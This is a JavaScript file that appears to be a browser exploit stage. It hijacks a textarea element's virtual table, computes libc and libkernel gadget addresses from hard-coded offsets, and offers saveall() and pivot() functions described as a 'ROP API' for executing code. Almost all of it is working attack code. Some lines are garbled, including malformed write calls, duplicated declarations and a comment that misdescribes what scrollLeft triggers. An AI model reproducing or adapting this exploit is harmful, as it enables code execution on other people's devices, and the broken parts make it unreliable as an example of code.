// create a new textarea element
var tarea = document.createElement("textarea");
// read the virtual table pointer of the textarea object
var realVTPointer = ReadPointerAt(addrof(tarea) + 0x18);
// allocate memory for a fake virtual table and copy the contents of the real virtual table into it
var fakeVTPointer = malloc(0x400);
WriteMemory(fakeVTPointer, ReadMemory(realVTPointer, 0x400));
// read the pointer to the real virtual table
var realvTable = ReadPointerAt(fakeVTPointer);
// allocate memory for a fake virtual table backup and copy the contents of the fake virtual table into it
var fakevTable = malloc(0x2000);
WriteMemory(fakevTable, ReadMemory(realvTable, 0x2000));
// overwrite the pointer to the real virtual table with the pointer to the fake virtual table
WritePointerAt(fakeVTPointer, fakevTable);
// allocate memory for a backup of the fake virtual table pointer and copy the contents of the fake virtual table pointer into it
var fakeVTPointerBackup = malloc(0x400);
WriteMemory(fakeVTPointerBackup, ReadMemory(fakeVTPointer, 0x400));
// calculate the address of the function pointer to be overwritten by subtracting a fixed offset from the address of the fake virtual table
var pltPointer = ReadPointerAt(fakevTable) - 10063176;


function GetGOTAddress(idx) {
  var p = pltPointer + idx * 16;
  var q = ReadMemory(p, 6);
  if (q[0] != 0xff || q[1] != 0x25) {
    throw "invalid GOT entry";
  }
  var offset = 0;
  for (var i = 5; i >= 2; i--) {
    offset = offset * 256 + q[i];
  }
  offset += p + 6;
  return ReadPointerAt(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = ReadPointerAt(fakevTable);
var libkernel_base = GetGOTAddress(705) - 0x10000;
var libc_base = GetGOTAddress(582);
var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

function saveall() {
  var ans = malloc(0x800);
  var bak = ReadPointerAt(fakevTable + 0x1d8);
  WritePointerAt(fakevTable + 0x1d8, saveall_addr);
  WritePointerAt(addrof(tarea) + 0x18, fakeVTPointer);
  tarea.scrollLeft = 0;
  WritePointerAt(addrof(tarea) + 0x18, realVTPointer);
  WriteMemory(ans, ReadMemory(fakeVTPointer, 0x400));
  WriteMemory(fakeVTPointer, ReadMemory(fakeVTPointerBackup, 0x400));
  var bak = ReadPointerAt(fakevTable + 0x1d8);
  WritePointerAt(fakevTable + 0x1d8, saveall_addr);
  WritePointerAt(fakeVTPointer + 0x38, 0x1234);
  write_ptr_ataddroftarea + 0x18, fakeVTPointer;
  tarea.scrollLeft = 0;
  write_ptr_ataddroftarea + 0x18, realVTPointer;
  WriteMemory(ans + 0x400, ReadMemory(fakeVTPointer, 0x400));
  WriteMemory(fakeVTPointer, ReadMemory(fakeVTPointerBackup, 0x400));
  return ans;
}
// PUBLIC ROP API
// This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
// The first 8 bytes of `buf` should be allocated but not used -- they are used internally.
// The actual ROP chain starts at `buf+8`
// Jump to `pivot_addr` to return
function pivot(buf) {
  var ans = malloc(0x400); // Allocate memory to store ROP chain result
  var bak = ReadPointerAt(fakevTable + 0x1d8); // Save pointer value at offset 0x1d8 of fake vtable
  WritePointerAt(fakevTable + 0x1d8, saveall_addr); // Set pointer at offset 0x1d8 of fake vtable to `saveall_addr`
  WritePointerAt(addrof(tarea) + 0x18, fakeVTPointer); // Overwrite target object's real vtable pointer with fake vtable pointer
  tarea.scrollLeft = 0; // Trigger garbage collection
  WritePointerAt(addrof(tarea) + 0x18, realVTPointer); // Restore target object's real vtable pointer
  WriteMemory(ans, ReadMemory(fakeVTPointer, 0x400)); // Copy fake vtable contents to `ans` buffer
  WriteMemory(fakeVTPointer, ReadMemory(fakeVTPointerBackup, 0x400)); // Restore original fake vtable contents
  var bak = ReadPointerAt(fakevTable + 0x1d8); // Save pointer value at offset 0x1d8 of fake vtable
  WritePointerAt(fakevTable + 0x1d8, pivot_addr); // Set pointer at offset 0x1d8 of fake vtable to `pivot_addr`
  WritePointerAt(fakeVTPointer + 0x38, buf); // Overwrite pointer at offset 0x38 of fake vtable with address of ROP chain
  WritePointerAt(ans + 0x38, ReadPointerAt(ans + 0x38) - 16); // Adjust offset 0x38 of `ans` to point to correct ROP chain location
  WritePointerAt(buf, ans); // Overwrite memory at `buf` with address of `ans` buffer
  WritePointerAt(addrof(tarea) + 0x18, fakeVTPointer); // Overwrite target object's real vtable pointer with fake vtable pointer
  tarea.scrollLeft = 0; // Trigger garbage collection
  WritePointerAt(addrof(tarea) + 0x18, realVTPointer); // Restore target object's real vtable pointer
  WriteMemory(fakeVTPointer, ReadMemory(fakeVTPointerBackup, 0x400)); // Restore original fake vtable contents
}
